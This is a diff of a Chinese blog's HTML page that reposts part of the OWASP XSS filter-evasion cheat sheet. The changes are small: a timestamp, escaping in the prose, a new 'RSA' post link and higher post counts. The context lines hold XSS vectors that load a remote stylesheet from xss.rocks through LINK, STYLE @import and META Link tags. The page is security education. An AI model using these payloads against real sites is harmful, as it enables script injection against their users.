@@ -65,7 +65,7 @@
 <meta property="og:site_name" content="Gality&#39;s Blog">
 <meta property="og:description" content="今天继续XSS的进一步学习，以下内容转载自Freebuf上的文章，原文章来自OWASP的xss备忘录">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-14T04:14:53.039Z">
+<meta property="og:updated_time" content="2019-10-14T05:31:40.993Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS绕过速查（一）">
 <meta name="twitter:description" content="今天继续XSS的进一步学习，以下内容转载自Freebuf上的文章，原文章来自OWASP的xss备忘录">
@@ -599,10 +599,10 @@
 <h3 id="2-49-远程样式表"><a href="#2-49-远程样式表" class="headerlink" title="2.49.    远程样式表"></a>2.49.    远程样式表</h3><p>(利用像远程样式表一样简单的形式，你可以将XSS攻击代码包含在可使用内置表达式进行重定义的样式参数里。)这只在IE和使用IE渲染模式Netscape8.1+。注意这里没有任何元素在页面中表明这页面包含了JavaScript。提示：这些远程样式表都使用了body标签,所以必须在页面中有除了攻击向量以外的内容存在时才会生效,  也就是如果是空白页的话你必须在页面添加一个字母来让攻击代码生效:</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;LINK REL=<span class="string">"stylesheet"</span> HREF=<span class="string">"http://xss.rocks/xss.css"</span>&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="2-50-远程样式表2"><a href="#2-50-远程样式表2" class="headerlink" title="2.50.    远程样式表2"></a>2.50.    远程样式表2</h3><p>这个和上面一样有效，不过使用了&lt;STYLE&gt;标签替代&lt;LINK&gt;标签.  这个细微的变化曾经用来攻击谷歌桌面。另一方面，如果在攻击向量后有HTML标签闭合攻击向量，你可以移除末尾的&lt;/STYLE&gt;标签。在进行跨站脚本攻击时，如不能同时使用等号或斜杠，这是非常有用的，这种情况在现实世界里不止一次发生了:</p>
+<h3 id="2-50-远程样式表2"><a href="#2-50-远程样式表2" class="headerlink" title="2.50.    远程样式表2"></a>2.50.    远程样式表2</h3><p>这个和上面一样有效，不过使用了STYLE标签替代LINK标签.  这个细微的变化曾经用来攻击谷歌桌面。另一方面，如果在攻击向量后有HTML标签闭合攻击向量，你可以移除末尾的/STYLE标签。在进行跨站脚本攻击时，如不能同时使用等号或斜杠，这是非常有用的，这种情况在现实世界里不止一次发生了:</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt;@<span class="keyword">import</span><span class="string">'http://xss.rocks/xss.css'</span>;&lt;/STYLE&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="2-51-远程样式表3"><a href="#2-51-远程样式表3" class="headerlink" title="2.51.    远程样式表3"></a>2.51.    远程样式表3</h3><p>这种方式仅在Opera 8.0(9.x不可以)中有效，但方法比较有创意.  根据RFC2616，设置一个Link头部不是HTTP1.1规范的一部分,但一些浏览器仍然允许这样做 (例如Firefox和  Opera).  这里的技巧是设置一个头部（和普通头部并没有什么区别，只是设置Link: &lt;<a href="http://xss.rocks/xss.css\&gt;" target="_blank" rel="noopener">http://xss.rocks/xss.css\&gt;</a>; REL=stylesheet）并且在远程样式表中包含使用了JavaScript的跨站脚本攻击向量，这一点是FireFox不支持的:</p>
+<h3 id="2-51-远程样式表3"><a href="#2-51-远程样式表3" class="headerlink" title="2.51.    远程样式表3"></a>2.51.    远程样式表3</h3><p>这种方式仅在Opera 8.0(9.x不可以)中有效，但方法比较有创意.  根据RFC2616，设置一个Link头部不是HTTP1.1规范的一部分,但一些浏览器仍然允许这样做 (例如Firefox和  Opera).  这里的技巧是设置一个头部（和普通头部并没有什么区别，只是设置<code>Link: &lt;http://xss.rocks/xss.css\&gt;; REL=stylesheet</code>）并且在远程样式表中包含使用了JavaScript的跨站脚本攻击向量，这一点是FireFox不支持的:</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;META HTTP-EQUIV=<span class="string">"Link"</span> Content=<span class="string">"&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet"</span>&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="2-52-远程样式表4"><a href="#2-52-远程样式表4" class="headerlink" title="2.52.    远程样式表4"></a>2.52.    远程样式表4</h3><p>这仅能在Gecko渲染引擎下有效并且需要在父页面绑定一个XML文件。具有讽刺意味的是 Netscape认为Gecko更安全 ，所以对绝大多数网站来说会受到漏洞影响:</p>
@@ -673,6 +673,10 @@
 
             <div class="post-nav-prev post-nav-item">
               
+                <a href="/2019/10/18/RSA/" rel="prev" title="RSA">
+                  RSA <i class="fa fa-chevron-right"></i>
+                </a>
+              
             </div>
           </div>
         
@@ -739,7 +743,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -757,7 +761,7 @@
       
       <div class="site-state-item site-state-tags">
         
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">标签</span>
         
       </div>
